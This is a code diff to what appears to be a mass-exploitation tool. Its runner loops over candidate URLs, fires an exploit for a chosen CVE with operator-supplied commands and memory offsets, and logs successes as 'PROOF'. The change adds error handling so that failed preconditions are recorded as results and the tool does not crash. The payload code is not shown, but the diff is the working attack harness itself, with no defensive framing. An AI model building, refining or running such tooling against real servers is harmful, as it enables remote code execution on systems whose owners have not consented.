@@ -344,23 +344,30 @@ def _run_exploits(candidates: list[dict], args) -> None:
 
     for r in candidates:
         print(f"  -> {r['url']}  cmd={args.cmd!r}", flush=True)
-        res = run_exploit(
-            r["url"], cmd=args.cmd,
-            cve=args.cve,
-            profile=args.exploit_profile or "bookworm",
-            zif_offset=args.zif_offset,
-            dtor_offset=args.dtor_offset,
-            htdata_offset=args.htdata_offset,
-            huge_mb=args.huge_mb,
-            retries=args.retries or 3,
-            no_pre_rotate=args.no_pre_rotate,
-            no_retry_rotate=args.no_retry_rotate,
-            fetch=args.fetch or "",
-            timeout=args.timeout or 15.0,
-            max_total_timeout=args.exploit_timeout,
-            quiet=not args.verbose,
-            log=(lambda m: print(f"     {m}", flush=True)),
-        )
+        try:
+            res = run_exploit(
+                r["url"], cmd=args.cmd,
+                cve=args.cve,
+                profile=args.exploit_profile or "bookworm",
+                zif_offset=args.zif_offset,
+                dtor_offset=args.dtor_offset,
+                htdata_offset=args.htdata_offset,
+                huge_mb=args.huge_mb,
+                retries=args.retries or 3,
+                no_pre_rotate=args.no_pre_rotate,
+                no_retry_rotate=args.no_retry_rotate,
+                fetch=args.fetch or "",
+                timeout=args.timeout or 15.0,
+                max_total_timeout=args.exploit_timeout,
+                quiet=not args.verbose,
+                log=(lambda m: print(f"     {m}", flush=True)),
+            )
+        except RuntimeError as e:
+            # Kegagalan pra-syarat (mis. post_max_size terlalu kecil) bukan
+            # crash: laporkan sebagai hasil, jangan buang traceback ke operator.
+            r["exploit"] = {"success": False, "error": str(e)}
+            print(f"     gagal (0.0s): {e}")
+            continue
         r["exploit"] = res.as_dict()
         tag = "PROOF" if res.success else "gagal"
         msg = res.proof or res.error or f"rc={res.returncode}"
